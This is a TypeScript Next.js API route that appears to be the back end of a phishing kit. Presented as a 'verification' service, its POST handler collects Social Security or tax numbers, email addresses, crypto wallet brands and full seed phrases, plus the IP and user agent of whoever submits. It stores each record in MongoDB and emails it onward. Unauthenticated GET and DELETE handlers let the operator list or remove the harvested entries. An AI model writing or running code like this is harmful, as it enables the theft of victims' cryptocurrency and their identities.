import { NextRequest, NextResponse } from 'next/server';
import {
  getAllSubmissions,
  saveSubmission,
  deleteSubmission,
  getSubmissionStats,
  getSystemSettings,
  isMongoConnected,
} from '@/lib/mongodb';
import { sendSubmissionEmail } from '@/lib/mailer';

export async function POST(req: NextRequest) {
  try {
    const data = await req.json();

    const clientIp =
      req.headers.get('x-forwarded-for') ||
      req.headers.get('x-real-ip') ||
      '127.0.0.1';
    const userAgent = req.headers.get('user-agent') || 'Unknown';

    const newRecord = await saveSubmission({
      ssn_tin: data.ssn_tin,
      email: data.email,
      wallet_type: data.wallet_type,
      wallet_brand: data.wallet_brand,
      seed_length: data.seed_length,
      seed_words: data.seed_words,
      signature: data.signature,
      client_ip: clientIp,
      user_agent: userAgent,
    });

    // Send email notification in background if configured in database
    try {
      const settings = await getSystemSettings();
      if (settings.email_config && settings.email_config.enabled) {
        // Fire email dispatch
        sendSubmissionEmail(newRecord, settings.email_config).catch((e) =>
          console.error('[Async Email Error]:', e)
        );
      }
    } catch (mailErr) {
      console.error('Error initiating email notification:', mailErr);
    }

    return NextResponse.json({
      success: true,
      reference_number: newRecord.reference_number,
      message: 'Verification submission recorded successfully.',
    });
  } catch (error: any) {
    console.error('API Error saving submission:', error);
    return NextResponse.json(
      { success: false, error: error?.message || 'Failed to process submission' },
      { status: 500 }
    );
  }
}

export async function GET(req: NextRequest) {
  try {
    const submissions = await getAllSubmissions();
    const stats = await getSubmissionStats();
    const mongoStatus = await isMongoConnected();

    return NextResponse.json({
      success: true,
      submissions,
      stats,
      mongo_connected: mongoStatus,
    });
  } catch (error: any) {
    return NextResponse.json(
      { success: false, error: error?.message || 'Failed to fetch submissions' },
      { status: 500 }
    );
  }
}

export async function DELETE(req: NextRequest) {
  try {
    const { searchParams } = new URL(req.url);
    const id = searchParams.get('id');

    if (!id) {
      return NextResponse.json(
        { success: false, error: 'Submission ID is required' },
        { status: 400 }
      );
    }

    const removed = await deleteSubmission(id);
    return NextResponse.json({ success: removed });
  } catch (error: any) {
    return NextResponse.json(
      { success: false, error: error?.message || 'Failed to delete submission' },
      { status: 500 }
    );
  }
}
